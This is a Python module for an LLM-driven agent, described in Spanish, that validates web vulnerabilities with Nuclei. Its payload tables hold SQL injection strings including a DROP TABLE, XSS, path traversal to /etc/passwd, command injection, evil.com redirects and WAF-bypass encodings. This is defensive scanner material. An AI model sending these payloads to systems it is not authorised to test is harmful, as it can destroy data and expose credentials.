#!/usr/bin/env python3
"""
Agente Dinámico - Valida vulnerabilidades usando análisis dinámico con Nuclei
Utiliza LLM para crear templates personalizados y validar explotabilidad
"""

from crewai import Agent
from langchain_openai import ChatOpenAI
from typing import Dict, Any, List
import json

class DynamicAgent:
    """Agente especializado en análisis dinámico con Nuclei"""
    
    def __init__(self, nuclei_tool):
        self.nuclei_tool = nuclei_tool
        self.llm = ChatOpenAI(
            model="gpt-5-mini",
            temperature=0.1
        )
        
        self.agent = Agent(
            role="Especialista en Análisis Dinámico y Penetration Testing",
            goal="Validar vulnerabilidades mediante análisis dinámico usando Nuclei y crear templates personalizados para explotación",
            backstory="""
            Eres un experto en penetration testing y análisis dinámico con más de 10 años 
            de experiencia en herramientas como Nuclei, Burp Suite, OWASP ZAP, y Nmap. 
            Tu especialidad es crear y ejecutar pruebas de penetración automatizadas 
            para validar vulnerabilidades en aplicaciones web y servicios.
            
            Tu experiencia incluye:
            - Creación de templates personalizados de Nuclei
            - Análisis de tráfico HTTP/HTTPS y protocolos de red
            - Técnicas de bypass de WAF y filtros de seguridad
            - Explotación manual y automatizada de vulnerabilidades
            - Correlación de hallazgos dinámicos con análisis estático
            
            Tu trabajo es fundamental para confirmar la explotabilidad real de las 
            vulnerabilidades identificadas y proporcionar evidencia práctica de su impacto.
            """,
            verbose=True,
            allow_delegation=False,
            llm=self.llm,
            tools=[self.nuclei_tool]
        )
    
    def get_nuclei_template_structure(self) -> Dict[str, Any]:
        """Estructura base para templates de Nuclei"""
        return {
            "id": "custom-vulnerability-test",
            "info": {
                "name": "Custom Vulnerability Test",
                "author": "GenIA Security Validation System",
                "severity": "high",
                "description": "Template description",
                "reference": [],
                "classification": {
                    "cwe-id": "CWE-XXX",
                    "owasp": "A01:2021",
                    "cve-id": "CVE-XXXX-XXXX"
                },
                "tags": ["custom", "validation"]
            },
            "requests": [
                {
                    "method": "GET",
                    "path": ["/vulnerable-endpoint"],
                    "headers": {
                        "User-Agent": "GenIA-Security-Scanner"
                    },
                    "matchers-condition": "and",
                    "matchers": [
                        {
                            "type": "status",
                            "status": [200]
                        },
                        {
                            "type": "word",
                            "words": ["vulnerability_indicator"]
                        }
                    ]
                }
            ]
        }
    
    def get_cwe_to_nuclei_mapping(self) -> Dict[str, Dict[str, Any]]:
        """Mapeo de CWEs a configuraciones específicas de Nuclei"""
        return {
            "CWE-89": {  # SQL Injection
                "tags": ["sqli", "injection"],
                "payloads": [
                    "' OR '1'='1",
                    "'; DROP TABLE users; --",
                    "' UNION SELECT 1,2,3 --",
                    "{{BaseURL}}/?id=1' AND (SELECT COUNT(*) FROM information_schema.tables)>0 --"
                ],
                "matchers": [
                    {"type": "word", "words": ["SQL syntax", "mysql_fetch", "ORA-", "PostgreSQL"]},
                    {"type": "regex", "regex": ["SQL.*error", "database.*error"]}
                ],
                "nuclei_templates": ["sql-injection", "blind-sqli", "error-based-sqli"]
            },
            "CWE-79": {  # XSS
                "tags": ["xss", "injection"],
                "payloads": [
                    "<script>alert('XSS')</script>",
                    "<img src=x onerror=alert('XSS')>",
                    "javascript:alert('XSS')",
                    "{{BaseURL}}/?q=<script>alert(document.domain)</script>"
                ],
                "matchers": [
                    {"type": "word", "words": ["<script>alert", "onerror=alert"]},
                    {"type": "regex", "regex": ["<script[^>]*>.*</script>"]}
                ],
                "nuclei_templates": ["xss-reflected", "xss-stored", "dom-xss"]
            },
            "CWE-352": {  # CSRF
                "tags": ["csrf", "auth"],
                "payloads": [
                    "<form method='POST' action='{{BaseURL}}/admin/delete'><input type='submit' value='Delete'></form>"
                ],
                "matchers": [
                    {"type": "status", "status": [200, 302]},
                    {"type": "word", "words": ["deleted", "success"], "negative": True}
                ],
                "nuclei_templates": ["csrf-token-bypass", "csrf-protection-bypass"]
            },
            "CWE-22": {  # Path Traversal
                "tags": ["lfi", "traversal"],
                "payloads": [
                    "../../../etc/passwd",
                    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                    "{{BaseURL}}/download?file=../../../etc/passwd"
                ],
                "matchers": [
                    {"type": "regex", "regex": ["root:.*:0:0:", "\\[drivers\\]"]},
                    {"type": "word", "words": ["root:", "daemon:", "# localhost"]}
                ],
                "nuclei_templates": ["lfi-linux", "lfi-windows", "path-traversal"]
            },
            "CWE-78": {  # Command Injection
                "tags": ["rce", "injection"],
                "payloads": [
                    "; id",
                    "| whoami",
                    "& echo vulnerable",
                    "{{BaseURL}}/exec?cmd=id"
                ],
                "matchers": [
                    {"type": "regex", "regex": ["uid=\\d+", "gid=\\d+"]},
                    {"type": "word", "words": ["vulnerable", "root", "administrator"]}
                ],
                "nuclei_templates": ["command-injection", "rce-detection"]
            },
            "CWE-200": {  # Information Disclosure
                "tags": ["disclosure", "info-leak"],
                "payloads": [
                    "{{BaseURL}}/.env",
                    "{{BaseURL}}/config.php",
                    "{{BaseURL}}/admin/"
                ],
                "matchers": [
                    {"type": "word", "words": ["DB_PASSWORD", "API_KEY", "SECRET"]},
                    {"type": "status", "status": [200]}
                ],
                "nuclei_templates": ["config-exposure", "sensitive-files", "directory-listing"]
            },
            "CWE-601": {  # Open Redirect
                "tags": ["redirect", "open-redirect"],
                "payloads": [
                    "{{BaseURL}}/redirect?url=http://evil.com",
                    "{{BaseURL}}/login?next=//evil.com"
                ],
                "matchers": [
                    {"type": "header", "headers": {"location": "evil.com"}},
                    {"type": "status", "status": [301, 302, 307, 308]}
                ],
                "nuclei_templates": ["open-redirect", "redirect-bypass"]
            }
        }
    
    def get_nuclei_command_templates(self) -> Dict[str, str]:
        """Templates de comandos Nuclei para diferentes tipos de escaneo"""
        return {
            "comprehensive": "nuclei -u {target} -t {templates_dir} -json -o {output_file}",
            "vulnerability_specific": "nuclei -u {target} -t {custom_template} -json -o {output_file}",
            "cwe_focused": "nuclei -u {target} -tags {cwe_tags} -json -o {output_file}",
            "severity_filtered": "nuclei -u {target} -severity {severity} -json -o {output_file}",
            "rate_limited": "nuclei -u {target} -rate-limit {rate} -json -o {output_file}",
            "authenticated": "nuclei -u {target} -header 'Authorization: Bearer {token}' -json -o {output_file}"
        }
    
    def get_validation_schema(self) -> Dict[str, Any]:
        """Esquema para el reporte de validación dinámica"""
        return {
            "dynamic_analysis_results": {
                "scan_summary": {
                    "target_url": "string",
                    "scan_timestamp": "string",
                    "nuclei_version": "string",
                    "templates_used": ["string"],
                    "total_requests_sent": "int",
                    "scan_duration": "string"
                },
                "vulnerability_validations": [
                    {
                        "vulnerability_id": "string - ID del reporte original",
                        "exploitation_status": "string - EXPLOITABLE|NOT_EXPLOITABLE|PARTIALLY_EXPLOITABLE|BLOCKED",
                        "confidence_level": "string - HIGH|MEDIUM|LOW",
                        "nuclei_findings": [
                            {
                                "template_id": "string",
                                "matched_at": "string - URL donde se encontró",
                                "severity": "string",
                                "description": "string",
                                "request": "string - Request HTTP",
                                "response": "string - Response HTTP",
                                "evidence": "string - Evidencia de explotación"
                            }
                        ],
                        "custom_templates_created": [
                            {
                                "template_name": "string",
                                "template_content": "string - YAML del template",
                                "creation_rationale": "string - Por qué se creó este template"
                            }
                        ],
                        "exploitation_evidence": {
                            "payload_used": "string",
                            "response_indicators": ["string"],
                            "impact_demonstration": "string",
                            "screenshots_base64": ["string - opcional"]
                        },
                        "waf_bypass_attempts": [
                            {
                                "technique": "string",
                                "payload": "string",
                                "success": "boolean"
                            }
                        ],
                        "false_positive_assessment": "string",
                        "exploitation_complexity": "string - LOW|MEDIUM|HIGH"
                    }
                ],
                "infrastructure_findings": [
                    {
                        "finding_type": "string - server_info|technology_stack|security_headers",
                        "description": "string",
                        "relevance_to_vulnerabilities": "string"
                    }
                ],
                "recommendations": [
                    {
                        "vulnerability_id": "string",
                        "immediate_actions": ["string"],
                        "long_term_fixes": ["string"],
                        "detection_methods": ["string"]
                    }
                ]
            }
        }
    
    def get_payload_encoding_techniques(self) -> Dict[str, List[str]]:
        """Técnicas de encoding para bypass de WAF"""
        return {
            "url_encoding": ["%3Cscript%3E", "%27%20OR%20%271%27%3D%271"],
            "double_encoding": ["%253Cscript%253E", "%2527%2520OR%2520%25271%2527%253D%25271"],
            "unicode_encoding": ["\u003Cscript\u003E", "\u0027\u0020OR\u0020\u0027\u0031\u0027\u003D\u0027\u0031"],
            "html_encoding": ["&#60;script&#62;", "&#39; OR &#39;1&#39;=&#39;1"],
            "base64_encoding": ["PHNjcmlwdD4=", "JyBPUiAnMSc9JzE="],
            "hex_encoding": ["0x3C736372697074", "0x27204F5220273127"],
            "case_variation": ["<ScRiPt>", "' oR '1'='1"],
            "comment_insertion": ["<scr/**/ipt>", "' OR/**/'1'='1"],
            "concatenation": ["'+'<script>'+'", "' OR ''||'1'='1"]
        }
    
    def get_nuclei_severity_mapping(self) -> Dict[str, str]:
        """Mapeo de severidades entre el sistema y Nuclei"""
        return {
            "Critical": "critical",
            "High": "high",
            "Medium": "medium",
            "Low": "low",
            "Info": "info"
        }